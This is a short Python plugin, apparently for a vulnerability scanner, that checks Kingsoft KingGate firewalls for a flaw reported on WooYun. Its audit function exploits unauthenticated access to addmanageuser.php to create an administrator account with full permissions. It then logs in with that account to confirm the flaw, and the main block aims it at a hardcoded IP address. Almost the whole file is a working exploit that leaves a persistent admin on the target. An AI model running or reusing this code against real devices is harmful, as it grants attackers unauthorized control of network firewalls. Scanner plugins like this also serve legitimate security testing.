#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2010-0135128
import urlparse
def assign(service, arg):
    if service == "kinggate":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'src/system/addmanageuser.php'
    code, head, res, errcode, _ = curl.curl2(url)
    pos1=head.find("PHPSESSID=")+10
    pos2=head.find("\n",pos1)
    session_id=head[pos1:pos2]
    postdata = "IG_current_menu_name=%25CF%25B5%25CD%25B3%25C5%25E4%25D6%25C3&IG_current_submenu_name=%25B9%25DC%25C0%25ED%25C9%25E8%25D6%25C3&IG_user=scanforvul&IG_password=123qwe%21%40%23&IG_password1=123qwe%21%40%23&IG_permission1=1&IG_permission2=1&IG_permission3=1&IG_permission4=1"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    url = arg + 'src/system/login.php'
    postdata = "session_id="+session_id+"&IG_user=scanforvul&IG_passwd=123qwe!@#&sutmit1=%C8%B7%C8%CF"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==302 and 'Location:' in head:
        security_hole("金山KingGate旧版网关防火墙添加管理员:http://www.wooyun.org/bugs/wooyun-2010-0135128")
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('kinggate', 'https://210.21.231.102/')[1])